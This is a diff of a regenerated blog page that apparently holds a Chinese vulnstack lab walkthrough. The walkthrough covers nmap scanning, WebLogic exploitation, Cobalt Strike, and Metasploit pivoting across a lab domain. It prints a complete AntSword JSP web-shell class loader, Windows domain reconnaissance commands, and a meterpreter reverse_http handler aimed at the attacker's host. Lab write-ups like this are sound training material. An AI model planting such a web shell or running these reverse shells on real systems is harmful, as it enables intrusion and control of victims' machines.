@@ -79,7 +79,7 @@
 <meta property="og:image" content="http://mamor5409.github.io/posts/8a9ea0cb/cs_Golden_Ticket.png">
 <meta property="og:image" content="http://mamor5409.github.io/posts/8a9ea0cb/cs_Golden_Ticket2.png">
 <meta property="article:published_time" content="2021-07-22T09:53:09.000Z">
-<meta property="article:modified_time" content="2021-07-25T00:32:11.397Z">
+<meta property="article:modified_time" content="2021-07-25T00:32:12.000Z">
 <meta property="article:author" content="Mamor">
 <meta property="article:tag" content="vulnstack">
 <meta name="twitter:card" content="summary">
@@ -291,7 +291,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-07-25 08:32:11" itemprop="dateModified" datetime="2021-07-25T08:32:11+08:00">2021-07-25</time>
+                <time title="修改时间：2021-07-25 08:32:12" itemprop="dateModified" datetime="2021-07-25T08:32:12+08:00">2021-07-25</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -316,7 +316,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>4.5k</span>
+              <span>4.4k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -340,7 +340,7 @@
 <p>Web密码错误的，在快照管理器里面选择转到1.3即可,默认为空，然后修改密码为统一密码</p>
 <p>然后再web主机上开启Weblogic服务</p>
 <p><img src="/posts/8a9ea0cb/start_weblogic.png"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dc    仅主机  10.10.10.10</span><br><span class="line">web   仅主机  10.10.10.80   NAT 192.168.0.80</span><br><span class="line">pc    仅主机  10.10.10.201  NAT 192.168.0.201</span><br><span class="line">kali  NAT     192.168.0.128</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dc    仅主机  10.10.10.10</span><br><span class="line">web   仅主机  10.10.10.80   NAT 192.168.0.80</span><br><span class="line">pc    仅主机  10.10.10.201  NAT 192.168.0.201</span><br><span class="line">kali  NAT     192.168.0.128</span><br></pre></td></tr></table></figure>
 
 <h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="nmap扫描端口"><a href="#nmap扫描端口" class="headerlink" title="nmap扫描端口"></a>nmap扫描端口</h4><p>用kaliping不通web主机，应该是开启了防火墙禁止了icmp</p>
 <p><code>sudo nmap 192.168.0.80 -sV</code></p>
@@ -376,7 +376,7 @@
 <p><code>C:\Oracle\Middleware\user_projects\domains\application\servers\AdminServer\tmp\_WL_user\项目名\随机字符\war\shell.jsp</code></p>
 <p>访问<code>http://*.*.*.*:7001/项目名/shell.jsp</code></p>
 <p>上传蚁剑的jsp马。密码为ant</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    class U extends ClassLoader &#123;</span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line">            super(c);</span><br><span class="line">        &#125;</span><br><span class="line">        public Class g(byte[] b) &#123;</span><br><span class="line">            return super.defineClass(b, 0, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public byte[] base64Decode(String str) throws Exception &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class clazz &#x3D; Class.forName(&quot;sun.misc.BASE64Decoder&quot;);</span><br><span class="line">            return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            Class clazz &#x3D; Class.forName(&quot;java.util.Base64&quot;);</span><br><span class="line">            Object decoder &#x3D; clazz.getMethod(&quot;getDecoder&quot;).invoke(null);</span><br><span class="line">            return (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String cls &#x3D; request.getParameter(&quot;ant&quot;);</span><br><span class="line">    if (cls !&#x3D; null) &#123;</span><br><span class="line">        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    class U extends ClassLoader &#123;</span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line">            super(c);</span><br><span class="line">        &#125;</span><br><span class="line">        public Class g(byte[] b) &#123;</span><br><span class="line">            return super.defineClass(b, 0, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public byte[] base64Decode(String str) throws Exception &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class clazz = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);</span><br><span class="line">            return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            Class clazz = Class.forName(&quot;java.util.Base64&quot;);</span><br><span class="line">            Object decoder = clazz.getMethod(&quot;getDecoder&quot;).invoke(null);</span><br><span class="line">            return (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String cls = request.getParameter(&quot;ant&quot;);</span><br><span class="line">    if (cls != null) &#123;</span><br><span class="line">        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
 
 <p><img src="/posts/8a9ea0cb/uploade_shell.png"></p>
 <p>使用蚁剑进行连接</p>
@@ -385,7 +385,7 @@
 <p>发现该机器上有安装360</p>
 <h4 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h4><p>在CS上创建listener 生成cs.exe后使用蚁剑运行，beacon成功上线</p>
 <p><img src="/posts/8a9ea0cb/cs1.png"></p>
-<h5 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">查看当前用户sid  shell whoami &#x2F;user</span><br><span class="line">查看系统信息  shell systeminfo</span><br><span class="line">查看域名      shell net config workstation</span><br><span class="line">查看域内用户  shell net user &#x2F;domain</span><br><span class="line">查看机器信息  net computers </span><br><span class="line">查看域内主机  shell net view</span><br><span class="line">查看有几个域  shell net view &#x2F;domain</span><br><span class="line">查看域管理员  shell net group &quot;domain admins&quot; &#x2F;domain  </span><br><span class="line">查看域控      shell net group &quot;domain controllers&quot; &#x2F;domain  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h5 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">查看当前用户sid  shell whoami /user</span><br><span class="line">查看系统信息  shell systeminfo</span><br><span class="line">查看域名      shell net config workstation</span><br><span class="line">查看域内用户  shell net user /domain</span><br><span class="line">查看机器信息  net computers </span><br><span class="line">查看域内主机  shell net view</span><br><span class="line">查看有几个域  shell net view /domain</span><br><span class="line">查看域管理员  shell net group &quot;domain admins&quot; /domain  </span><br><span class="line">查看域控      shell net group &quot;domain controllers&quot; /domain  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p><code>shell whoami /user</code></p>
 <p><img src="/posts/8a9ea0cb/cs_whoami_user.png"></p>
@@ -425,7 +425,7 @@
 <h4 id="CS派生MSF"><a href="#CS派生MSF" class="headerlink" title="CS派生MSF"></a>CS派生MSF</h4><p>在CS中创建一个 Foreign HTTP listener</p>
 <p><img src="/posts/8a9ea0cb/cs_msf.png"></p>
 <p>在msf中</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">msf exploit(multi&#x2F;handler) &gt;  set payload windows&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line">set &#x3D;&gt; payload windows&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; set lhost 192.168.0.128</span><br><span class="line">lhost &#x3D;&gt; 192.168.0.128</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; set lport 6666</span><br><span class="line">lport &#x3D;&gt; 6666</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; run</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler </span><br><span class="line">msf exploit(multi/handler) &gt;  set payload windows/meterpreter/reverse_http</span><br><span class="line">set =&gt; payload windows/meterpreter/reverse_http</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 192.168.0.128</span><br><span class="line">lhost =&gt; 192.168.0.128</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 6666</span><br><span class="line">lport =&gt; 6666</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>
 
 <p><img src="/posts/8a9ea0cb/cs_msf_shell.png"></p>
 <p>msf添加路由</p>
@@ -596,7 +596,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">177</span>
+          <span class="site-state-item-count">176</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -609,7 +609,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">52</span>
+        <span class="site-state-item-count">51</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -653,12 +653,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">1m</span>
+    <span title="站点总字数">984k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">15:11</span>
+    <span title="站点阅读时长">14:55</span>
 </div>
 
 <!--
@@ -669,7 +669,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共221.6k字</span>
+  <span class="post-count">博客全站共218.1k字</span>
 </div>
 -->
         
